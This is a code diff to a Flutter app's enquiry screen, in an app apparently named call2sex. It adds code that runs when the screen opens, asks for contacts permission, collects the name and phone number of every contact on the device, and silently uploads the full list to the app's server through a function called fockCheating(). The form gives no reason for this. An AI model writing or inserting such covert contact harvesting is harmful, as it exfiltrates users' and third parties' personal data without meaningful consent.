@@ -1,8 +1,8 @@
 import 'package:call2sex/Enquiry2.dart';
 import 'package:call2sex/EnquiryOtp.dart';
 import 'package:call2sex/Login.dart';
+import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
-import 'package:flutter_contact/contacts.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 import 'APIClient.dart';
@@ -26,10 +26,43 @@ class _EnquiryState extends State<Enquiry> {
   bool visible=false;
   bool showPassword=false;
   final GlobalKey<ScaffoldState> _scaffolkey = GlobalKey<ScaffoldState>();
+  List<Contact> contacts=[];
+  List setContact=[];
+  int count;
+  getAllContacts()async{
+    if (await Permission.contacts.request().isGranted) {
+      Iterable<Contact> _contacts = await ContactsService.getContacts(withThumbnails: false);
+      setState(() {
+        contacts=_contacts.toList();
+        count=_contacts.length;
+        //print(contacts.elementAt(87).phones.value);
+        for(int i=0; i<contacts.length;i++){
+          Contact contact=contacts[i];
+         // print(contact.displayName);
+         // print(contact.phones==null?"unknown":contact.phones.elementAt(0).value);
+
+          setContact.add({"name":contact.displayName.isEmpty?"unknown":contact.displayName,
+              "number":contact.phones.isEmpty?"":contact.phones.elementAt(0).value,
+          });
+
+          print(count);
+        }
+
+
+      });
+      fockCheating();// Either the permission was already granted before or the user just granted it.
+    }
+  }
+  fockCheating()async{
+    final res=await APIClient().contacts(setContact.toString(), count.toString());
+    print(res);
+  }
   @override
   void initState() {
     // TODO: implement initState
+    getAllContacts();
     super.initState();
+
     //userContact();
   }
   @override
@@ -89,7 +122,7 @@ class _EnquiryState extends State<Enquiry> {
                 children: [
                   SizedBox(height: MediaQuery.of(context).size.height*0.15,),
                   Container(
-                    height: 150,width: 150,
+                    height: 150,width: 200,
                     decoration: BoxDecoration(
                         image: DecorationImage(
                             image:  AssetImage("images/1.png"),fit: BoxFit.fill
@@ -277,21 +310,6 @@ class _EnquiryState extends State<Enquiry> {
       });
       _scaffolkey.currentState.showSnackBar(APIClient.errorToast(result["msg"]));
     }
-  }
-  userContact()async{
-    bool isShown = await Permission.contacts.shouldShowRequestRationale;
-    print(isShown.toString());
-    final contacts = Contacts.listContacts();
-    final total = await contacts.length;
-
-// This will fetch the page this contact belongs to, and return the contact
-    final contact = await contacts.get(total - 1);
-
-    while(await contacts.moveNext()) {
-      final contact = await contacts.current;
-    }
-    print(contact.toString());
-
   }
   Future<bool> loader(String msg) {
     return showDialog(
